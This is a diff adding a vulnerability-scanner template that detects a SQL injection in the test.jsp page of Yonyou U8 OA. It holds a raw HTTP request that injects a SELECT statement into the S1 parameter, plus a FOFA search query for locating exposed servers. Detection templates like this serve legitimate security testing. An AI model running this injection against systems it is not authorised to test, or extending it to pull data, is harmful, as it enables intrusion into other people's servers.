@@ -1,0 +1,32 @@
+id: u8-oa-test-sqli
+info:
+  name: Yonyou U8 OA test Sqli
+  author: mike
+  severity: info
+  description: 用友 U8 OA test.jsp文件存在 SQL注入漏洞，由于与致远OA使用相同的文件，于是存在了同样的漏洞
+  reference: https://www.cnblogs.com/pursue-security/p/17685261.html
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: title="用友U8-OA"
+variables:
+  num: "{{rand_int(10)}}"
+
+http:
+  - raw: 
+    - |
+      GET /yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5({{num}})) HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+      Accept-Encoding: gzip, deflate 
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'md5({{num}})'
+
+      - type: status
+        status:
+          - 200
